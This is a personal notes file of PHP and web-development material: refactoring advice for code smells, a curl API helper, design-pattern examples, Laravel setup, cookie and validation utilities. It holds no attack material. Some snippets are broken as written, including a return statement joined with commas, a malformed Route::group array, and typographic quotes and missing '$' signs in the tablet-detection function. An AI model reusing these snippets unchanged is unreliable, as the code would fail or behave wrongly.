of a given parameter. The strategy that we implement to remove the switches is as follows:

1. Extract the switch in a method.
2. Move the newly extracted method in a class more accountable to the knowledge
   of polymorphism.
3. Decide whether to replace the type code executed by the switch with a
   subclass, or a state/strategy pattern.
4. After setting the structure of inheritance, we can use the replace
   conditional with the polymorphism strategy.

Sometimes the polymorphism may not be the appropriate solution. In this case we can simply
replace the condition code with the methods, and in cases where the condition must return null, we can
think of introducing a NullObject.

#+begin_src php 

class User
{
  ...
  public function initCredentials()
  {
    switch($this->type)
    {
      case 'admin':
      $this->addCredential('admin');
      break;
      case 'premium':
      $this->addCredential('premium');
      break;
      case 'base':
      $this->addCredential('base');
      break;
      default:
      throw new Exception('Error: type is not valid');
      break;
  }
}
...
}
#+end_src 

**** Extract method
**** Move method
**** Replace type code with subclass
**** Replace typecode with state/strategy
**** Replace conditional with polymorphism
**** Introducing NullObject
*** Lazy class
**** intro

All classes or subclasses that we make must have a reason to exist. If you think a class is not doing
enough and is not very useful, it must be removed, because it costs a lot to maintain. If a subclass is not
used in a class, we can collapse the inheritance hierarchy. If an attribute is an instance of a class of
which we use only a single attribute or a single method, let’s make it a class inline into the referred class.

**** Refactoring Strategies
**** Collapse hierarchy
**** Inline class
*** Speculative Generality
**** intro
Developers often commit the sin of pride, thinking that they can predict the future. How many times
have we decided to continue with the amount of code produced because we believed that someday it
would be useful, for example, to have one abstract class, or a certain method, or that particular interface,
only to find that such a day never arrives? Unfortunately, we must accept that we cannot predict the
future. To have a good-smelling code, we must remove all the speculative code, such as code that
nobody uses except for a test case. We must think only about what we need today, not tomorrow.
For this bad smell, the strategies are similar to bad smells we have already discussed. In fact, we can
use the strategy of collapse hierarchy for those subclasses that are not used, or the inline class to remove
delegations from classes that are not really useful. We can also remove parameters from methods that
never use them, and rename all the methods that are not sufficiently expressive.
As previously suggested, a nice way to find this kind of speculation is when we realize that the only
users of these methods are the test cases. So, remove the method and the associated test cases.

**** Collapse hierarchy
**** Inline class
**** Remove parameter
**** Rename method
*** Temporary Field
In object-oriented programming, all the attributes of a certain class should characterize that object in
any context. Often when we implement our code, it happens that some of the attributes are used only in
one context and the others in another context, perhaps chosen by a given parameter. This type of
behavior is wrong because it introduces a lot of unnecessary conditional logic within our code. Instead
we can safely extract a subclass that better characterizes the object in that kind of context.

Therefore, the strategy is to extract a subclass and add the attributes that in a certain context do not
represent the object. If the condition allows no object if the variable is null, we can introduce a
NullObject to handle this case.

#+begin_src php 
class Customer
{
  protected $company_name;
  protected $first_name;
  protected $last_name;
  protected $is_company;
  public function getFullName()
  {
    if ($this->is_company)
    {
      return $this->getCompanyName();
    }
    return $this->getFirstName() . ' ' . $this->getLastName();
  }
}
#+end_src 

In the previous class we have a $first_name and $last_name that are temporary properties of our
class. They are used only when Customer is not a company, so they are context-dependent. We can
remove this double behavior, extracting two subclasses and making Customer an abstract class.

#+begin_src php 
abstract class Customer
{
  abstract public function getFullName();
}
class Person extends Customer
{
  protected $first_name;
  protected $last_name;
  public function getFullName()
  {
    return $this->getFirstName(), ' ', $this->getLastName();
  }
}

class Company extends Customer
{
  protected $company_name;
  public function getFullName()
  {
    return $this->getCompanyName();
  }
}

#+end_src 
**** Extract subclass
**** Introduce NullObject
*** Data class
**** intro
The data classes are all those classes that only have to set and get a set of their attributes, without having
some business logic. They are also called setter/getter classes. Usually these classes, when born, publicly
expose all their attributes, and this behavior may be too brash. When the class is small and we have it
under control, the problem will be minimal, but when these classes grow, if we are not careful, we risk
exposing too much. These classes are like children—while they are growing, they must assume some
responsibility.

The first suggestion is to set all the attributes of those classes to private or protected, and create a
series of getter and setter that may provide public access to these attributes. This strategy is known as
encapsulation field. When an attribute is a collection of objects or structured data, we must do the same
thing because the collection can’t be changed all at once—only one item at a time. This strategy is called
encapsulate the collection. Moreover, if we have attributes that should never be modified outside, we
should not remove setting methods that modify them. If there is an object that uses the setter on the
attributes that should not be changed, extract the external method into our data class and related
external object to it, so that the change is internal.

**** Encapsulate field
**** Encapsulate collection
**** Remove setting method
*** Comments
**** intro
When we say that comments are a source of bad smells, hordes of programmers may become angry. In
our opinion, as that of Martin Fowler, the point is that a comment is not a bad smell, but when the
comment is inline to code and it is used to explain what the code does, this is a bad smell. All method or
class comments are important and should be used to explain how something works, but not what it
does. To remove this bad smell, you can implement the following strategy whenever you want to write a
comment to a block of code:

1. Instead of the comment, write a method where the method name expresses
   exactly the same concept of the comment.
2. Extract the block of code that we wanted to comment in the method.
3. Invoke the method where we wanted to put the comment.

But if we want to write a comment about what a certain call to method does because it isn’t clear,
rename the method with a more expressive name and reduce the list of parameters passed, introducing
a parameter object or preserving the whole object via parameters or creating objects of any object. If
you need to remember some rules required by the system in a certain context, instead of writing the
comment, introduce a method that tests the assertion rule.
**** Extract method
**** Preserve whole object
**** Introduce parameter object
     
* CURL examples
** sample usage
#+begin_src php
   /**
     * Send curl request to Splynx API
     *
     * @param string $method Method: get, delete, put, post
     * @param string $url
     * @param array $param
     * @return array JSON results
     */
    private function curl_process($method, $url, $param = array())
    {
        $ch = curl_init();

        if ($this->debug == true) {
            print $method . " to " . $url . "\n";
            print_r($param);
        }

        $headers = array();
        $headers[] = 'Content-type: application/json';
        $auth_str = $this->make_auth();
        $headers[] = 'Authorization: Splynx-EA (' . $auth_str . ')';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        if ($method == 'DELETE') {
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "DELETE");
        }

        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($param));
        }

        if ($method == 'PUT') {
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($param));
        }

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Splynx PHP API ' . $this->version);

        if ($this->debug == true) {
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
        }

        $out = curl_exec($ch);

        if (curl_errno($ch)) {
            trigger_error("cURL failed. Error #" . curl_errno($ch) . ": " . curl_error($ch), E_USER_ERROR);
        }

        // Parse headers and body
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($out, 0, $header_size);
        $out = substr($out, $header_size);

        // Parse headers
        $this->parseResponseHeaders($header);

        $this->response_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        if ($this->debug == true) {
            var_dump($out);
        }

        $this->result = false;

        switch ($method) {
            case 'POST':
                if ($this->response_code == 201) {
                    $this->result = true;
                }
                break;

            case 'PUT':
                if ($this->response_code == 202) {
                    $this->result = true;
                }
                break;

            case 'DELETE':
                if ($this->response_code == 204) {
                    $this->result = true;
                }
                break;

            default:
                if ($this->response_code == 200) {
                    $this->result = true;
                }
                break;
        }

        $this->response = json_decode($out, true);

        return $this->result;
    }
#+end_src

* Defensive programming
** premature optimization
*** symptoms
**** Readability
One of the most common indicators of premature optimization is poor code
readability. The majority of optimizations are more complicated solutions and
therefore harder to read and understand than a simpler but less optimal
solution.
**** Dependency
Optimization must sometimes cross encapsulation boundaries, leading to greater
dependency between classes or modules that can reduce the robustness of the
code. These dependencies make changes more difficult by causing each change to
affect more of the code base than would otherwise be necessary.

**** Constraints
Another indicator of premature optimization is overly constrained data input,
leading to an inflexibility that will not allow changes later in development. If
a more general solution is evident, then it is likely that the code was written
to be optimized rather than robust.
*** prevention
**** Do not optimize
Resist the temptations, and wait until the end of development. 

Then, only optimize to achieve your performance goals; otherwise, you will be
wasting time and money when the application could be in use already. This is an
easy goal to say, but much harder to realize. The best tool at your disposal for
achieving this goal is discipline. Think about every algorithm in terms of
flexibility and clarity, and then decide whether you have accidentally
considered performance.
**** K.I.S.S. (Keep It Simple, Stupid)
When it comes to optimization, keeping it simple means waiting until the end of
development to add the complications inherent in most optimizations. Avoiding
complicated code serves two purposes. The obvious effect is improved development
speed and flexibility
**** use High-Level Languages
**** Encapsulation and Abstraction
Surprisingly, one of the most important coding practices for proper optimization
can have a negative impact on application speed. Encapsulation is the collection
of related code into a single unit such as a class or module, which can then use
abstraction to hide the details of the data and implementation behind an
interface that is subjected to fewer changes than the internals.
**** Strategy Pattern
One of the most useful methods of encapsulation and abstraction for optimization
purposes is the Strategy Design Pattern [GoF95]. The basic idea of the Strategy
Pattern is to abstract the interface to an algorithm so that multiple algorithms
for the same functionality can be encapsulated in interchangeable objects.


*** Performance Tradeoffs
At this point you might be thinking, “Well, sure these optimizations lead to
code that is harder to read and modify, but aren’t the performance improvements
worth the tradeoff?” The answer is “not usually.” The fastest way to understand
why is to profile the entire application and find out what percentage of time is
spent in each of the different algorithms and modules.
** CAP epidemic
*** The symptoms of a CAP Epidemic are 
 - Bugs that keep reappearing in different code locations. 
 - The heavy use of search and replace for editing code. 
 - Nonsensical comments and names due to a change in context of the copied code. 
 - Strange bugs caused by forgetting small changes to copied code. 
 - Complex procedures required for updating a single piece of information. 
 - Duplicate occurrences of any human-editable information. 

*** To prevent a CAP Epidemic 

 - Know what project code is available for reuse. 
 - Know what external libraries are available for use in place of implementing the functionality internally. 

 - Use high-level languages and their features such as functions, objects,
   templates, preprocessors, generic programming techniques, and aspect-oriented
   programming techniques.

 - Automate any unavoidable information duplication using scripting and other automation tools. 

 - Code to avoid the need for asset duplication. 

 - Keep up to date on new programming technologies such as Intentional Programming and Generative Programming. 

*** To cure the effects of a CAP Epidemic 

 - Use refactoring to parameterize duplicate code and subsequently move it to a single location. 

 - Take advantage of refactoring tools. 

 - Keep up to date on the advancements in automating refactoring. 

 - Test often to ensure that the refactoring does not change the behavior.
**  NIH syndrome
*** The symptoms of NIH Syndrome:

 - A desire to control every aspect of the application code because of a lack of trust in other programmers. 
 - Not using external code and libraries because of an unnecessary fear of: 
  - Poor performance 
  - Unknown learning curve 
  - Minor missing functionality 
  - Debugging difficulties 
  - Affect on deadlines 
 - Duplicating code and work internally that has already been accomplished externally. 
 - Heavy reliance on internal development because of the belief that all facets
   of software engineering can be accomplished better internally.

*** To prevent NIH Syndrome: 

 - Use middleware and open source to reduce development time. 

 - Balance the time spent evaluating external solutions with the savings they provide. 

 - Be sure the appropriate level of technical support is available as a reassurance that the external solution will not cause undue problems. 

 - Understand the benefits and disadvantages of code snippets, standard libraries, run-time libraries, active libraries, and frameworks. 

 - Use .NET to expand the available external solutions. 

 - Use the Strategy, Adapter, Bridge, and Façade design patterns to provide
   encapsulation and abstraction of external libraries to allow easier
   integration and smoother replacement when necessary.

*** To cure the effects of NIH Syndrome: 

 - Do not allow internal code to become a sacred cow, protected for no valid reason. 

 - Do not be afraid to remove internal code in favor of better external code. 

 - Perform any transition to external code one step at a time using standard refactoring techniques. 

 - When possible, change or wrap the external interface to conform to internal standards. 

 - Apply workarounds carefully, and remove them as soon as they are no longer necessary. 

 - Use testing liberally to verify external code works as expecting and perform regression testing when changing implementations.

* Design patterns
** Abstract Factory
*** Intent
 - Provide an interface for creating families of related or dependent objects without specifying their concrete classes.
 - A hierarchy that encapsulates: many possible "platforms", and the construction of a suite of "products".
 - The new operator considered harmful. 
*** Check list
 - Decide if "platform independence" and creation services are the current source of pain.
 - Map out a matrix of "platforms" versus "products".
 - Define a factory interface that consists of a factory method per product.
 - Define a factory derived class for each platform that encapsulates all references to the new operator.
 - The client should retire all references to new, and use the factory methods to create the product objects. 
#+begin_src php
<?php

/*
 * BookFactory classes
 */
abstract class AbstractBookFactory {
    abstract function makePHPBook();
    abstract function makeMySQLBook();
}

class OReillyBookFactory extends AbstractBookFactory {
    private $context = "OReilly";
    function makePHPBook() {
        return new OReillyPHPBook;
    }
    function makeMySQLBook() {
        return new OReillyMySQLBook;
    }
}

class SamsBookFactory extends AbstractBookFactory {
    private $context = "Sams";
    function makePHPBook() {
        return new SamsPHPBook;
    }
    function makeMySQLBook() {
        return new SamsMySQLBook;
    }
}

/*
 *   Book classes
 */
abstract class AbstractBook {
    abstract function getAuthor();
    abstract function getTitle();
}

abstract class AbstractMySQLBook extends AbstractBook {
    private $subject = "MySQL";
}

class OReillyMySQLBook extends AbstractMySQLBook {
    private $author;
    private $title;
    function __construct() {
        $this->author = 'George Reese, Randy Jay Yarger, and Tim King';
        $this->title = 'Managing and Using MySQL';
    }
    function getAuthor() {
        return $this->author;
    }
    function getTitle() {
        return $this->title;
    }
}

class SamsMySQLBook extends AbstractMySQLBook {
    private $author;
    private $title;
    function __construct() {
        $this->author = 'Paul Dubois';
        $this->title = 'MySQL, 3rd Edition';
    }
    function getAuthor() {
        return $this->author;
    }
    function getTitle() {
        return $this->title;
    }
}

abstract class AbstractPHPBook extends AbstractBook {
    private $subject = "PHP";
}

class OReillyPHPBook extends AbstractPHPBook {
    private $author;
    private $title;
    private static $oddOrEven = 'odd';
    function __construct()
    {
        //alternate between 2 books
        if ('odd' == self::$oddOrEven) {
            $this->author = 'Rasmus Lerdorf and Kevin Tatroe';
            $this->title = 'Programming PHP';
            self::$oddOrEven = 'even';
        }
        else {
            $this->author = 'David Sklar and Adam Trachtenberg';
            $this->title = 'PHP Cookbook';
            self::$oddOrEven = 'odd';
        }
    }
    function getAuthor() {
        return $this->author;
    }
    function getTitle() {
        return $this->title;
    }
}

class SamsPHPBook extends AbstractPHPBook {
    private $author;
    private $title;
    function __construct() {
        //alternate randomly between 2 books
        mt_srand((double)microtime() * 10000000);
        $rand_num = mt_rand(0, 1);

        if (1 > $rand_num) {
            $this->author = 'George Schlossnagle';
            $this->title = 'Advanced PHP Programming';
        }
        else {
            $this->author = 'Christian Wenz';
            $this->title = 'PHP Phrasebook';
        }
    }
    function getAuthor() {
        return $this->author;
    }
    function getTitle() {
        return $this->title;
    }
}

/*
 *   Initialization
 */

  writeln('BEGIN TESTING ABSTRACT FACTORY PATTERN');
  writeln('');

  writeln('testing OReillyBookFactory');
  $bookFactoryInstance = new OReillyBookFactory;
  testConcreteFactory($bookFactoryInstance);
  writeln('');

  writeln('testing SamsBookFactory');
  $bookFactoryInstance = new SamsBookFactory;
  testConcreteFactory($bookFactoryInstance);

  writeln("END TESTING ABSTRACT FACTORY PATTERN");
  writeln('');

  function testConcreteFactory($bookFactoryInstance)
  {
      $phpBookOne = $bookFactoryInstance->makePHPBook();
      writeln('first php Author: '.$phpBookOne->getAuthor());
      writeln('first php Title: '.$phpBookOne->getTitle());

      $phpBookTwo = $bookFactoryInstance->makePHPBook();
      writeln('second php Author: '.$phpBookTwo->getAuthor());
      writeln('second php Title: '.$phpBookTwo->getTitle());

      $mySqlBook = $bookFactoryInstance->makeMySQLBook();
      writeln('MySQL Author: '.$mySqlBook->getAuthor());
      writeln('MySQL Title: '.$mySqlBook->getTitle());
  }

  function writeln($line_in) {
    echo $line_in."<br/>";
  }

?>
/*
Output

BEGIN TESTING ABSTRACT FACTORY PATTERN


testing OReillyBookFactory
first php Author: Rasmus Lerdorf and Kevin Tatroe
first php Title: Programming PHP
second php Author: David Sklar and Adam Trachtenberg
second php Title: PHP Cookbook
MySQL Author: George Reese, Randy Jay Yarger, and Tim King
MySQL Title: Managing and Using MySQL


testing SamsBookFactory
first php Author: Christian Wenz
first php Title: PHP Phrasebook
second php Author: George Schlossnagle
second php Title: Advanced PHP Programming
MySQL Author: Paul Dubois
MySQL Title: MySQL, 3rd Edition


END TESTING ABSTRACT FACTORY PATTERN
*/
#+end_src

** Builder Design Pattern
*** Intent

Separate the construction of a complex object from its representation so that the same construction process can create different representations.
Parse a complex representation, create one of several targets.

*** Problem

An application needs to create the elements of a complex aggregate. The
specification for the aggregate exists on secondary storage and one of many
representations needs to be built in primary storage.

*** Check list

Decide if a common input and many possible representations (or outputs) is the problem at hand.
Encapsulate the parsing of the common input in a Reader class.
Design a standard protocol for creating all possible output representations. Capture the steps of this protocol in a Builder interface.
Define a Builder derived class for each target representation.
The client creates a Reader object and a Builder object, and registers the latter with the former.
The client asks the Reader to "construct".
The client asks the Builder to return the result.

*** Rules of thumb

 - Sometimes creational patterns are complementary: Builder can use one of the
   other patterns to implement which components get built. Abstract Factory,
   Builder, and Prototype can use Singleton in their implementations.

 - Builder focuses on constructing a complex object step by step. Abstract
   Factory emphasizes a family of product objects (either simple or complex).
   Builder returns the product as a final step, but as far as the Abstract
   Factory is concerned, the product gets returned immediately.

 - Builder often builds a Composite.

 - Often, designs start out using Factory Method (less complicated, more
   customizable, subclasses proliferate) and evolve toward Abstract Factory,
   Prototype, or Builder (more flexible, more complex) as the designer discovers
   where more flexibility is needed.

* jquery mobile swipe example
#+begin_src javascript
// the line below makes use of touch gestures of jquery mobile only
<script type="text/javascript">$(document).bind("mobileinit", function(){$.extend(  $.mobile , {autoInitializePage: false})});</script>
<script src="{{@BASE}}/ui/jquery.mobile-1.4.5/jquery.mobile-1.4.5.min.js"></script>
  $(document).ready(function() {  
        /*=============================================== jquery mobile swipe */
        var isMenuClosed = $("#wrapper").hasClass("enlarged");
            
             $("body").swiperight(function() {  
                    if($("#wrapper").hasClass("enlarged")) 
                        isMenuClosed = true;
                    else
                        isMenuClosed = false;

                    // console.log("right menu clased");
                    // console.log(isMenuClosed);
                    if(!isMenuClosed){
                        $.Sidemenu.openLeftBar();   
                    }
                
            });

           $("body").swipeleft(function() {  
                    if($("#wrapper").hasClass("enlarged")) 
                        isMenuClosed = true;
                    else
                        isMenuClosed = false;


                    // console.log("left menu clased");
                    // console.log(isMenuClosed);
                    if(isMenuClosed){
                        $.Sidemenu.openLeftBar();   
                    }

            });  
    });  
#+end_src

* laravel
** installing laravel sample blog

 #+begin_src shell
 $ sudo composer create-project --prefer-dist laravel/laravel blog
 #+end_src

** routes
*** controllers grouping

#+begin_src php
Route::group(['prefix']=>'home', function()
{
  Route::get('/', 'HomeController@showIndex');
  Route::get('/about', 'HomeController@About');
  Route::get('/contact', 'HomeController@showContact');
});

#+end_src
You see, inside the group, we need not write ‘home’ anymore. It is explicitly told
to our router.
 
*** listing all routes with artisan

  #+begin_src shell
  $ php artisan routes
  #+end_src

*** named routes
   
 #+begin_src php
 Route::get('session/create', [
 'as'=>'create',
 'use'=>'SessionController@create']);
 //////
 Route::get('register', [
  'before'=>['guest'],
  'as'=>['register'],
  'use'=>['SessionController@register']
 ]);

 //You can write it like this also:

 Route::get('register', [
  'as'=>['register'],
  'use'=>['SessionController@register']
 ])->before('guest');
 #+end_src
** using sqlite as database
 first make sure sqlite drivers for php is installed

 #+begin_src shell
 $ sudo apt-get install php-sqlite3
 $ sudo apt-get install php7.0-sqlite3
 # create a sample database in /storage folder
 $ sqlite3 database.sqlite

 # run the migrate command
 $ php artisan migrate
 #+end_src

 #+begin_src php 
 dotenv = new Dotenv\Dotenv(DIR . '/../', '.' . getenv('APP_ENV') . '.env');
 dotenv->overload(); //this is important
 // change the following in database.php from 'mysql' to 'sqlite'
 'default' => env('DB_CONNECTION', 'sqlite'),
 // change 'database =>' 
 'sqlite' => [
		    'driver' => 'sqlite',
			 // 'database' => env('DB_DATABASE', database_path('database.sqlite')),
			 'database' => storage_path() . '/database.sqlite',
			 'prefix' => '',
 ]
 #+end_src 

* javascript cookie functions
#+begin_src javascript
function setCookie(c_name,c_value,c_expiredays,c_path,c_domain) {
   var c_exdate=new Date();
   c_exdate.setDate(c_exdate.getDate()+c_expiredays);
   document.cookie=c_name+ "=" +escape(c_value)+((c_expiredays==null) ? "" : ";expires="+c_exdate.toUTCString()) +"; path="+ c_path +"; domain="+ c_domain;
}

function getCookie(tag) {
  var value = null
  var myCookie = document.cookie + ";"
  var findTag = tag + "="
  var endPos
  if (myCookie.length > 0) {
  var beginPos = myCookie.indexOf(findTag)
  if (beginPos != -1) {
  beginPos = beginPos + findTag.length
  endPos = myCookie.indexOf(";",beginPos)
  if (endPos == -1)
  endPos = myCookie.length
  value = unescape(myCookie.substring(beginPos,endPos))
  }
  }
return value
}

function deleteCookie(cookie) {
var yesterday = 24 * 60 * 60 * 1000
var expireDate = new Date()
expireDate.setTime (expireDate.getTime() - yesterday)
document.cookie =cookie + "=" + escape("nothing") + ";" + "expires" + "=" + expireDate.toGMTString()
}
#+end_src
* useful functions
** dump
#+begin_src php
function php_version()
{
    $v = explode('.',PHP_VERSION);

    return array(
           'major'      =>  $v[0],
           'minor'      =>  $v[1],
           'release'    =>  $v[2]);
}

function php_version_maj_min()
{
    $vprts = php_version();
    return ($vprts['major'] . '.' . $vprts['minor']);
}

function ini_file_name()
{
    $sysinfo = get_sysinfo();
    return (!empty($sysinfo['PHP_INI'])?$sysinfo['PHP_INI_BASENAME']:'php.ini');
}

function get_file_contents($file)
{
    if (function_exists('file_get_contents')) {
        $strs = @file_get_contents($file);
    } else {
        $lines = @file($file);
        $strs = join(' ',$lines);
    }
    return $strs;
}

function uname($part = 'a')
{
    $result = '';
    if (!function_is_disabled('php_uname')) {
        $result = @php_uname($part);
    } elseif (function_exists('posix_uname') && !function_is_disabled('posix_uname')) {
        $posix_equivs = array(
                     'm' => 'machine',
                     'n' => 'nodename',
                     'r' => 'release',
                     's' => 'sysname'
                 );
        $puname = @posix_uname();
        if ($part == 'a' || !array_key_exists($part,$posix_equivs)) {
           $result = join(' ',$puname);
        } else {
           $result = $puname[$posix_equivs[$part]];
        }
    } else {
        if (!function_is_disabled('phpinfo')) {
            ob_start();
            phpinfo(INFO_GENERAL);
            $pinfo = ob_get_contents();
            ob_end_clean();
            if (preg_match('~System.*?(</B></td><TD ALIGN="left">| => |v">)([^<]*)~i',$pinfo,$match)) {
                $uname = $match[2];
                if ($part == 'r') {
                    if (!empty($uname) && preg_match('/\S+\s+\S+\s+([0-9.]+)/',$uname,$matchver)) {
                        $result = $matchver[1];
                    } else {
                        $result = '';
                    }
                } else {
                    $result = $uname;
                }
            }
        } else {
            $result = '';
        }
    }
    return $result;
}

function calc_word_size($os_code)
{
    $wordsize = null;
    if ('win' === $os_code) {
        ob_start();
        phpinfo(INFO_GENERAL);
        $pinfo = ob_get_contents();
        ob_end_clean();
        if (preg_match('~Compiler.*?(</B></td><TD ALIGN="left">| => |v">)([^<]*)~i',$pinfo,$compmatch)) {
            if (preg_match("/(VC[0-9]+)/i",$compmatch[2],$vcmatch)) {
                $compiler = strtoupper($vcmatch[1]);
            } else {
                $compiler = 'VC6';
            }
        } else {
            $compiler = 'VC6';
        }
        if ($compiler === 'VC9' || $compiler === 'VC11' || $compiler === 'VC14') {
			if (preg_match('~Architecture.*?(</B></td><TD ALIGN="left">| => |v">)([^<]*)~i',$pinfo,$archmatch)) {
				if (preg_match("/x64/i",$archmatch[2])) {
					$wordsize = 64;
				} else {
					$wordsize = 32;
				}
            } elseif (isset($_ENV['PROCESSOR_ARCHITECTURE']) && preg_match('~(amd64|x86-64|x86_64)~i',$_ENV['PROCESSOR_ARCHITECTURE'])) {
                if (preg_match('~Configure Command.*?(</B></td><TD ALIGN="left">| => |v">)([^<]*)~i',$pinfo,$confmatch)) {
                    if (preg_match('~(x64|lib64|system64)~i',$confmatch[2])) {
                        $wordsize = 64;
                    }
                }
            } else {
				$wordsize = 32;
			}
        }
    }
    if (empty($wordsize)) {
        $wordsize = ((-1^0xffffffff)?64:32);
    }
    return $wordsize;
}

function extension_dir()
{
    $extdir = ini_get('extension_dir');
    if ($extdir == './' || ($extdir == '.\\' && is_ms_windows())) {
        $extdir = '.';
    }
    return $extdir;
}
function extension_dir_path()
{
    $ext_dir = extension_dir();
    if ($ext_dir == '.' || (dirname($ext_dir) == '.')) {
        $ext_dir_path = @realpath($ext_dir);
    } else {
        $ext_dir_path = $ext_dir;
    }
    return $ext_dir_path;
}

function default_ini_path()
{
    return (realpath($_SERVER['DOCUMENT_ROOT']));
}
#+end_src
** check for valid mcode

#+begin_src php
function ab_mc($vmc)
	{
			 $mc = $vmc;
			
			if( 10 != strlen($mc) )
				return false;
			if("1111111111" == $mc||"0000000000"== $mc||"2222222222"== $mc||"3333333333"== $mc||"4444444444"== $mc|| 
				"5555555555"== $mc||"6666666666"== $mc||"7777777777"== $mc||"8888888888"== $mc||"9999999999"== $mc)
				return false;
				
				$c = intval($mc[9]);
				$n = 10 * intval($mc[0]) +
					 9 * intval($mc[1] ) + 
					 8 * intval($mc[2] ) + 
					 7 * intval($mc[3] ) +
					 6 * intval($mc[4] ) + 
					 5 * intval($mc[5] ) + 
					 4 * intval($mc[6] ) + 
					 3 * intval($mc[7] ) +
					 2 * intval($mc[8] ) ;
							   
				$r= $n - 11 * intval($n/11);
				
				if( (0==$r && $r==$c) || (1==$r && 1== $c) || ($r > 1 && $c== 11 - $r) )
					return true;
								
				return false;
	}
#+end_src

** IPv6 regex with preg_match
IPv6 is coming, I hope you are all ready for it! This function should help you
out when developing software that needs to be IPv6 aware.

#+begin_src php
function valid_ipv6_address( $ipv6 )
{
        $pattern1 = '([A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}';
        $pattern2 = '[A-Fa-f0-9]{1,4}::([A-Fa-f0-9]{1,4}:){0,5}[A-Fa-f0-9]{1,4}';
        $pattern3 = '([A-Fa-f0-9]{1,4}:){2}:([A-Fa-f0-9]{1,4}:){0,4}[A-Fa-f0-9]{1,4}';
        $pattern4 = '([A-Fa-f0-9]{1,4}:){3}:([A-Fa-f0-9]{1,4}:){0,3}[A-Fa-f0-9]{1,4}';
        $pattern5 = '([A-Fa-f0-9]{1,4}:){4}:([A-Fa-f0-9]{1,4}:){0,2}[A-Fa-f0-9]{1,4}';
        $pattern6 = '([A-Fa-f0-9]{1,4}:){5}:([A-Fa-f0-9]{1,4}:){0,1}[A-Fa-f0-9]{1,4}';
        $pattern7 = '([A-Fa-f0-9]{1,4}:){6}:[A-Fa-f0-9]{1,4}';

        $full = "/^($pattern1)$|^($pattern2)$|^($pattern3)$|^($pattern4)$|^($pattern5)$|^($pattern6)$|^($pattern7)$/";

        if(!preg_match($full, $ipv6))
        return (0); // is not a valid IPv6 Address

    return (1);
}
#+end_src
Basic example usage of this function

#+begin_src php
$addr6 = "2001:2d12:c4fe:5afe::1";
if ( valid_ipv6_address( $addr6 ) )
{
    printf ( "%s is a valid IPv6 Address!n", $addr6 );
}
else
{
    printf ( "%s is *NOT* a valid IPv6 Address!n", $addr6 );
}

$addr6 = "4d4x:3daz:rdc2:23sd::1";
if ( valid_ipv6_address( $addr6 ) )
{
    printf ( "%s is a valid IPv6 Address!n", $addr6 );
}
else
{
    printf ( "%s is *NOT* a valid IPv6 Address!n", $addr6 );
}
#+end_src 
Gives us this output

2001:2d12:c4fe:5afe::1 is a valid IPv6 Address!
4d4x:3daz:rdc2:23sd::1 is *NOT* a valid IPv6 Address!
**  Check if IPv4 address is from a private range.
This function is very handy if you need to allow or stop people from submitting
private address spaces into you application. It has many uses.

#+begin_src php 
function ip_is_private($ip)
{
        $pri_addrs = array(
                          '10.0.0.0|10.255.255.255',
                          '172.16.0.0|172.31.255.255',
                          '192.168.0.0|192.168.255.255',
                          '169.254.0.0|169.254.255.255',
                          '127.0.0.0|127.255.255.255'
                         );

        $long_ip = ip2long($ip);
        if($long_ip != -1) {

            foreach($pri_addrs AS $pri_addr)
            {
                list($start, $end) = explode('|', $pri_addr);

                 // IF IS PRIVATE
                 if($long_ip >= ip2long($start) && $long_ip <= ip2long($end))
                 return (TRUE);
            }
    }

return (FALSE);
}
#+end_src 

Example of this function being used
#+begin_src php
$ip_address1 = "10.4.200.1";
$ip_address2 = "192.168.0.2";
$ip_address3 = "213.224.100.43";

if ( ip_is_private ( $ip_address1 ) )
{
    printf ( "%s is from a private address rangen", $ip_address1 );
}
else
{
    printf ( "%s is *NOT* from a private address rangen", $ip_address1 );
}

if ( ip_is_private ( $ip_address2 ) )
{
    printf ( "%s is from a private address rangen", $ip_address2 );
}
else
{
    printf ( "%s is *NOT* from a private address rangen", $ip_address2 );
}

if ( ip_is_private ( $ip_address3 ) )
{
    printf ( "%s is from a private address rangen", $ip_address3 );
}
else
{
    printf ( "%s is *NOT* from a private address rangen", $ip_address3 );
}
#+end_src

Which gives us this output

10.4.200.1 is from a private address range
192.168.0.2 is from a private address range
213.224.100.43 is *NOT* from a private address range
** output number of bytes in human readable format
#+begin_src php
function make_pretty($bytes)
{
    $symbols = array('B', 'KiB', 'MiB', 'GiB', 'TiB', 'PiB', 'EiB', 'ZiB', 'YiB');

    if($bytes == 0)
        return sprintf('%.2f '.$symbols[0], 0);

    $exp = floor(log(abs($bytes)) / log(1024));

    return sprintf('%.2f '.$symbols[$exp], $bytes/pow(1024, floor($exp)));
}
//example
//echo make_pretty(167892598784); //  156.36 GiB
//echo make_pretty(719267016);    //  685.95 MiB
//echo make_pretty(114893);       //  112.20 KiB
//echo make_pretty(6218);         //  6.07 KiB
//echo make_pretty(42);           //  42.00 B
//echo make_pretty(0);            //  0.00 B
//echo make_pretty(-50);          // -50.00 B
#+end_src

** mobile related
#+begin_src php
$userAgent=$_SERVER[’HTTP_USER_AGENT’];
function isTablet()
{
 global $userAgent;
if (strstr($userAgent, "iPad") ||
    strstr($userAgent, "Kindle") ||
    strstr($userAgent, "wOSBrowser") ||
    (strstr($userAgent, "Android")&& strstr(userAgent, "Tablet")) ||
    (strstr($userAgent, "Android")&&
    ! strstr(userAgent, "Mobile")))
 return true;

 return false;
}
#+end_src

* useful resources
** php snippets
http://psoug.org/browse.htm?cid=2
** cookbook
http://pleac.sourceforge.net/pleac_php/index.html
http://pleac.sourceforge.net/
** PHP best practices

http://www.phptherightway.com/

** website performance tips
https://gtmetrix.com/
** other

https://github.com/ziadoz/awesome-php

https://stackoverflow.com/documentation/php/topics

https://github.com/Svish/TimerPHP/blob/master/src/Timer.php
